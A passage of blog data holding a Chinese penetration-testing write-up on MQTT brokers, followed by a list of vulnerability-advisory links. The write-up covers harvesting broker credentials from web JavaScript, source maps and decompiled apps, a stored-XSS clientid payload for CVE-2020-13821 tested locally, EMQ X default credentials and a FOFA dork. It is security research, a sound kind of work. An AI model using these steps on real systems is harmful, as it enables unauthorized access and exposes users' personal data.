detecotor&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;好了，有了这几个就够了。开始我们的实战之旅。&lt;/p&gt;\n&lt;h3 id=\&#34;获取方法\&#34;&gt;&lt;strong&gt;获取方法&lt;/strong&gt;&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;web应用中直接捕获&lt;/strong&gt;&lt;br&gt;\n在浏览目标时我一般会打开Chrome浏览器的开发者调试工具，通过查看请求信息或这直接搜索mqtt的字样来确定是否使用MQTT的javascript文件。另外一个就是可以查看websockets请求看是否有进行mqtt的连接操作等。&lt;/p&gt;\n&lt;p&gt;一旦发现使用MQTT后，就可以继续查看javascript文件来找到连接的host、端口、用户名以及密码信息。对于目前流行的云厂商，一般还会开启tls。或者这些信息后，我们就可以进行深入的分析或利用。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967556371.png\&#34; alt=\&#34;web应用中获取\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;除此之外，我也喜欢开启Brup suite记录通信流量，而且Brup suite支持websockets的记录。通过对历史记录的搜索功能可以快速发现MQTT相关内容。也可以根据个人习惯来快速确定。值得一提的是，一些内容在访问主页时就可以发现，有一些则会在一些其他页面，对于一些比较多的页面，可以使用爬虫的方式来提高效率，如通过headless的方式或者使用一些开源的2.0爬虫也可以。所有爬虫的流量经过Burp suite即可。对于流量比较大的，可以使用burp的loggeer++插件将流量记录到elasticsearch中。当然这里使用其他的代理也可以，如mitmproxy、goproxy等。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967583808.png\&#34; alt=\&#34;burpsuite获取mqtt信息\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;除此之外，还可以通过分析javascript文件中的连接信息，进行批量爬取来发现mqtt信息。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;通过.map文件获取源代码来获取&lt;/strong&gt;&lt;br&gt;\n在实际的过程中可能会遇到只有一个登录页面，登录页面只有引用mqtt库的js文件，并没有发起请求。爬虫也无法访问到页面时怎么办呢？目前的许多网站喜欢使用webpack打包javascript文件，其中包括了vue开发的站点。在这种情况时，可以试试是否存在.map文件，一旦在实战中探测到这类文件，那么就可以下载目标网站的javascript的源代码文件。这里我比较喜欢使用source detecotor来实现。关于source detecotor的安装与使用可以看&lt;a href=\&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/\&#34;&gt;https://bacde.me/post/unpack-webpack-via-sourcemap/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;下图是通过下载源代码来发现其中的配置信息。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967607269.png\&#34; alt=\&#34;通过源代码获取mqtt信息\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ol start=\&#34;2\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;爆破js文件，从js文件中获取&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;在上述方法都失效的情况下，还可以通过爆破js文件的路径来尝试获取信息。观察目标的js存放路径，结合常见的js文件路径生成字典进行探测。&lt;/p&gt;\n&lt;p&gt;这里列举几个常见js文件名，大家可以收集自己的：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;mqtt.js&lt;/li&gt;\n&lt;li&gt;config.js&lt;/li&gt;\n&lt;li&gt;main.js&lt;/li&gt;\n&lt;li&gt;mqtt.class.js&lt;/li&gt;\n&lt;li&gt;app.js&lt;/li&gt;\n&lt;li&gt;env.js&lt;/li&gt;\n&lt;li&gt;default.js&lt;/li&gt;\n&lt;li&gt;index.js&lt;/li&gt;\n&lt;li&gt;url.js&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;可以多试试，或许有意想不到的效果。可以看看如下两个例子：&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967628546.png\&#34; alt=\&#34;爆破js文件1\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967641825.png\&#34; alt=\&#34;爆破js文件2\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;android应用各种获取配置信息&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;除web端之外,移动端可以通过反编译apk源代码搜索mqtt等关键字、查看xml配置文件来发现。除此之外，在研究中发现一些车企的移动端也使用了MQTT，但是他们将内容放在了so文件中，由于时间关系，本次还没来得及对其进行深入的分析。&lt;/p&gt;\n&lt;p&gt;以下这个例子就是反编译app源码后，发现嵌入了一些页面文件，其中可以看到mqtt的配置信息。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;7\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967653590.png\&#34; alt=\&#34;android反编译源码获取mqtt信息\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ol start=\&#34;2\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;一些关键字&lt;/strong&gt;&lt;br&gt;\npaho-mqtt/1.0.1/mqttws31.min.js&lt;br&gt;\npaho-mqtt.js&lt;br&gt;\nmqtt.aliyuncs.com&lt;br&gt;\nmqtt.js&lt;/p&gt;\n&lt;p&gt;iotdevicegateway&lt;/p&gt;\n&lt;p&gt;一旦发现上述内容，基本上可以确定使用了mqtt。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;0x01-连接mqtt\&#34;&gt;0x01 连接MQTT&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;strong&gt;连接发现的mqtt&lt;/strong&gt;&lt;br&gt;\nweb端中的mqtt一般通过websockets进行连接，使用mqtt-pwn是无法连接成功的。这里可以通过websockets的客户端进行连接。将发现的mqtt内容填写如工具中即可进行连接。连接成功后可以发布和订阅内容，订阅的topic一般也写在代码中。&lt;br&gt;\n推荐一个在线工具&lt;a href=\&#34;http://tools.emqx.io/\&#34;&gt;http://tools.emqx.io/&lt;/a&gt;。界面如下图：&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;8\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967682085.png\&#34; alt=\&#34;emqx连接mqtt\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ol start=\&#34;2\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;带来的风险&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;获取了这些信息除了跟web代码中的存在什么样的安全问题呢？&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;敏感信息泄漏&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;在实际的研究过程中可以发现，通过获取的信息连接后，我们可以查看到其他用户的信息，其中会包含敏感信息。这就导致了敏感信息泄漏。下图中的系统使用了阿里云的MQTT，由于泄漏了mqtt配置信息，通过连接并订阅topic，可以看到泄漏了不该我们应该看到的信息，如用户手机号码、昵称、以及管理员与用户对话内容。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;9\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967703581.png\&#34; alt=\&#34;mqtt敏感信息泄露\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;strong&gt;发布恶意内容的&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;连接成功后我们可以直接发布消息到队列中，这里我们可以直接绕过web端的防御，通过fuzz构造恶意的数据，比如植入xss攻击代码来实现攻击web端或移动端的用户。&lt;/p&gt;\n&lt;p&gt;另外，网络上公开的一些管理平台同样因为过滤不严，导致存在xss。这可以使我们直接攻击管理员。这里介绍两个漏洞，CVE-2020-13821和CVE-2020-13932。编号CVE-2020-13821漏洞的产品是HiveMQ Broker management console中，攻击者可以通过恶意的clientid来攻击admin的控制台；编号CVE-2020-13932漏洞的产品是Apache ActiveMQ Artemis,攻击者可通过构造恶意的clientid或topics名字来攻击admin的控制台。&lt;/p&gt;\n&lt;p&gt;这里测试CVE-2020-13821漏洞，该漏洞在hivemq4.4.0版本中已经修复，本地搭建的版本为hivemq 4.3.2。&lt;/p&gt;\n&lt;p&gt;docker命令：&lt;code&gt;docker run -p 8080:8080 -p 1883:1883 hivemq/hivemq4:4.3.2&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;以上映射的端口可以自己定义，我这里环境使用的是8990和2883。docker启动后，即可打开&lt;code&gt;http://127.0.0.1:8990&lt;/code&gt; （可改为自己的端口，默认是8080），用户名和密码为admin和hivemq。&lt;/p&gt;\n&lt;p&gt;我们可以使用mqttfx进行连接，在clientid中加入xss payload &lt;code&gt;&amp;lt;img/src=x onerror=alert(1)&amp;gt;&lt;/code&gt;，ip和端口填入自己环境或目标信息，点击连接即可，当然在实战中如果需要用户名和密码，填入即可。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;10\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967729552.png\&#34; alt=\&#34;mqtt管理平台xss\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;回到hivemq的管理平台，点击&lt;code&gt;clients&lt;/code&gt;菜单，点击&lt;code&gt;Refresh Snaphot&lt;/code&gt;即可触发执行payload，这就是一个存储型的XSS。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;11\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967746199.png\&#34; alt=\&#34;mqtt管理平台xss\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;strong&gt;可获取其他更多信息&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;通过连接上mqtt，可以尝试枚举其他topic的，来后去更多的内容，以此来检查是否存在更加敏感的信息，如gps位置、用户数据等。这里推荐一个工具mqttfx，跨平台软件。下面举一个例子。&lt;/p&gt;\n&lt;p&gt;首先从web页面中获取到相关信息。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;12\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967765471.png\&#34; alt=\&#34;获取更多信息\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;接下来可以获取web扫描全部端口或nmap来识别mqtt协议。找到mqtt端口。通常端口都为默认的1883。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;13\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967784837.png\&#34; alt=\&#34;nmap扫描mqtt端口\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;可以通过获取的连接信息来添加到软件中或者使用mqtt-pwn进行操作，下图为使用mqttfx进行连接。接下来可以尝试后去更多信息来进行渗透。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;14\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967811498.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;15\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967826205.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;也可以使用mqtt-pwn进行连接，mqtt-pwn列出了系统的topics。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;16\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967833467.png\&#34; alt=\&#34;mqtt-pwn 连接mqtt获取topics\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;0x02-mqtt管理平台\&#34;&gt;0x02 MQTT管理平台&lt;/h2&gt;\n&lt;p&gt;对于MQTT应用之外，还可以关注管理平台。目前EMQ X是其中比较流行的一个 。&lt;/p&gt;\n&lt;p&gt;EMQ X全称 Erlang/Enterprise/Elastic MQTT Broker，它是基于 Erlang/OTP 语言平台开发，支持大规模连接和分布式集群，发布订阅模式的百万级开源 MQTT 消息服务器。EMQ X常见端口和默认密码为：&lt;/p&gt;\n&lt;p&gt;TCP 端口： 1883&lt;/p&gt;\n&lt;p&gt;Websocket 端口： 8083&lt;/p&gt;\n&lt;p&gt;TCP/TLS 端口： 8883&lt;/p&gt;\n&lt;p&gt;Websocket/TLS 端口： 8084&lt;/p&gt;\n&lt;p&gt;管理平台端口：18083&lt;/p&gt;\n&lt;p&gt;默认用户名密码：admin/public&lt;/p&gt;\n&lt;p&gt;FOFA Dork：(port=&amp;quot;18083&amp;quot;&amp;amp;&amp;amp;title=&amp;quot;dashboard&amp;quot;) || body=&amp;quot;href=/static/emq.ico&amp;quot;&lt;/p&gt;\n&lt;p&gt;通过登录平台，可以很方便的看到客户端连接、主题、订阅信息等，还可以通过添加规则来过滤数据。本地搭建的效果如下：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;17\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967862299.png\&#34; alt=\&#34;管理平台默认口令\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;除此之外rabbitmq、hivemq等也都有管理的平台，这里可以参考网络上的内容即可，这里不做赘述。&lt;/p&gt;\n&lt;h2 id=\&#34;0x03-总结\&#34;&gt;0x03 总结&lt;/h2&gt;\n&lt;p&gt;本文主要研究在实际的应用中如何获取mqtt信息，以及获取的信息带来的潜在风险。MQTT方面的安全还有很多内容等待着我们去挖掘。我也在研究中，希望以此抛砖引玉，能够更多的大佬一起交流和研究。&lt;/p&gt;\n&lt;p&gt;最后的重点，建议搭建本地搭建环境或者在授权情况下进行测试，不要对外网目标进行非法测试和破坏。否则造成的一切后果与本人无关。&lt;/p&gt;\n&lt;h2 id=\&#34;0x04-引用\&#34;&gt;0x04 引用&lt;/h2&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html\&#34;&gt;https://docs.aws.amazon.com/iot/latest/developerguide/mqtt-ws.html&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html\&#34;&gt;https://www.hivemq.com/blog/mqtt-over-websockets-with-hivemq/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html\&#34;&gt;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;http://tools.emqx.io/\&#34;&gt;http://tools.emqx.io/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/\&#34;&gt;https://bacde.me/post/unpack-webpack-via-sourcemap/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://payatu.com/advisory/hivemq-mqtt-broker---xss-over-mqtt\&#34;&gt;https://payatu.com/advisory/hivemq-mqtt-broker---xss-over-mqtt&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-13932\&#34;&gt;https://nvd.nist.gov/vuln/detail/CVE-2020-13932&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;mqtt-security-part-two&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;上一篇 &lt;a href=\&#34;https://bacde.me/post/mqtt-security-part-one/\&#34;&gt;物联网安全之MQTT协议安全 &lt;/a&gt;主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。&lt;/p&gt;\n&lt;p&gt;在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967523996.png\&#34; alt=\&#34;mqtt应用场景\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;center&gt;EMQ X Broker 场景&lt;/center&gt;\n&lt;h2 id=\&#34;0x00-获取mqtt认证信息\&#34;&gt;0x00 获取MQTT认证信息&lt;/h2&gt;\n&lt;p&gt;目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;物联网安全之MQTT渗透实战&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;automotive&#34;,&#34;slug&#34;:&#34;prvJjB7Fua5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/prvJjB7Fua5/&#34;},{&#34;name&#34;:&#34;mqtt&#34;,&#34;slug&#34;:&#34;cu9Tg0uRbMd&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cu9Tg0uRbMd/&#34;},{&#34;name&#34;:&#34;security&#34;,&#34;slug&#34;:&#34;f1IJJzl-LNP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/f1IJJzl-LNP/&#34;},{&#34;name&#34;:&#34;car hacking&#34;,&#34;slug&#34;:&#34;JdYDio18R72&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JdYDio18R72/&#34;},{&#34;name&#34;:&#34;mqtt-pwn&#34;,&#34;slug&#34;:&#34;tCcj-UHo7-S&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/tCcj-UHo7-S/&#34;},{&#34;name&#34;:&#34;pentesting&#34;,&#34;slug&#34;:&#34;DxvQ-UKqgTa&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/DxvQ-UKqgTa/&#34;}],&#34;date&#34;:&#34;2020-09-13 11:20:42&#34;,&#34;dateFormat&#34;:&#34;2020-09-13&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/mqtt-security-part-two/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;11 min read&#34;,&#34;time&#34;:604000,&#34;words&#34;:2710,&#34;minutes&#34;:11},&#34;description&#34;:&#34;上一篇 物联网安全之MQTT协议安全 主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。\n在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x00-%E8%8E%B7%E5%8F%96mqtt%E8%AE%A4%E8%AF%81%E4%BF%A1%E6%81%AF\&#34;&gt;0x00 获取MQTT认证信息&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%BC%80%E5%8F%91%E7%9A%84%E4%B8%80%E7%82%B9%E7%9F%A5%E8%AF%86\&#34;&gt;&lt;strong&gt;开发的一点知识&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%9E%E6%88%98%E5%B7%A5%E5%85%B7\&#34;&gt;&lt;strong&gt;实战工具&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%8E%B7%E5%8F%96%E6%96%B9%E6%B3%95\&#34;&gt;&lt;strong&gt;获取方法&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x01-%E8%BF%9E%E6%8E%A5mqtt\&#34;&gt;0x01 连接MQTT&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x02-mqtt%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0\&#34;&gt;0x02 MQTT管理平台&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x03-%E6%80%BB%E7%BB%93\&#34;&gt;0x03 总结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x04-%E5%BC%95%E7%94%A8\&#34;&gt;0x04 引用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。&lt;br&gt;\n注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0day申请了cve编号，详情都发在sec-list。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1543.html\&#34;&gt;【漏洞预警】pixie 在线图片编辑器全版本存在SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1555.html\&#34;&gt;【漏洞预警】Onethink 全版本SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1542.html\&#34;&gt;【漏洞预警】Struts2 最新命令执行漏洞S2-052[最新更新，PoC,漏洞绕过]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1544.html\&#34;&gt;Cockpit CMS SSRF漏洞 0day&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1545.html\&#34;&gt;TPSHOP 多用户商城系统任意文件读取&amp;amp;&amp;amp;SSRF 0day&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1559.html\&#34;&gt;【漏洞预警】Metinfo 5.3.5- 5.3.13 SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1517.html\&#34;&gt;【漏洞预警】Metinfo 5.x.x版本 SQL注入漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1384.html\&#34;&gt;威胁情报预警：Elasticsearch勒索软件事件&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1389.html\&#34;&gt;威胁情报预警：Couchdb勒索事件&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;!-- more --&gt;\n&lt;ol start=\&#34;10\&#34;&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1520.html\&#34;&gt;【漏洞预警】D-link 850L等一系列产品存在多处漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1485.html\&#34;&gt;【漏洞预警】浙江大华摄像存在0day后门&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1489.html\&#34;&gt;【漏洞预警】Apache Struts2 远程代码执行漏洞S2-046&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1493.html\&#34;&gt;【漏洞预警】IIS 6.0 远程代码执行0day&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1494.html\&#34;&gt;【漏洞预警】PHPCMSV9_Getshell漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1497.html\&#34;&gt;【漏洞预警】Jenkins未验证代码执行_CVE-2017-1000353&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1498.html\&#34;&gt;【高危漏洞预警】Wordpress Core 远程代码执行0day（无需验证和插件）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1499.html\&#34;&gt;【漏洞预警】Wordpress 全版本密码重置0day漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;[【漏洞预警】Samba远程代码执行漏洞][(ttps://nosec.org/home/detail/1502.html)&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1460.html\&#34;&gt;【漏洞预警】Node.js 反序列化漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1475.html\&#34;&gt;【漏洞预警】Wordpress NextGEN注入漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/2725.html\&#34;&gt;【漏洞预警】致远OA 0day 漏洞预警&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1926.html\&#34;&gt;【漏洞预警】Mini_httpd组件可能漏洞影响257万IOT设备（CVE-2018-18778）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/2491.html\&#34;&gt;【威胁预警】iSCSI未授权访问漏洞，数万iSCSI可能受影响&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/2709.html\&#34;&gt;【漏洞预警】Coremail配置信息泄露漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1748.html\&#34;&gt;13万Mikrotik设备被植入挖矿代码&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1755.html\&#34;&gt;【漏洞预警】Struts2最新RCE漏洞S2-057（CVE-2018-11776）-带POC&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1705.html\&#34;&gt;【漏洞预警】Weblogic最新远程命令执行漏洞（CVE-2018-2894&amp;amp;CVE-2018-2893）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1610.html\&#34;&gt;【漏洞预警】GPON光纤路由器越权和远程命令执行漏洞（CVE-2018-10561 &amp;amp; CVE-2018-10562）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1616.html\&#34;&gt;【漏洞预警】DrayTek公司多个型号路由器产品最新的0day漏洞，漏洞影响可能影响110万设备&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1621.html\&#34;&gt;蚂蚁矿机多款型号存在远程命令执行漏洞（CVE-2018-11220）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1608.html\&#34;&gt;【漏洞预警】Weblogic反序列化命令执行漏洞_CVE-2018-2628&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1605.html\&#34;&gt;【事件分析】Cisco Smart Install安全漏洞&amp;amp;&amp;amp;远程代码执行漏洞【CVE-2018-0171】&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1606.html\&#34;&gt;【漏洞预警】CVE-2018-1273 Spring Data Commons 远程代码执行漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1604.html\&#34;&gt;【威胁预警】Weblogic wsl-wsat远程代码执行漏洞进行挖矿&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1583.html\&#34;&gt;【漏洞预警】雄迈uc-httpd Web服务应用任意文件读取漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a 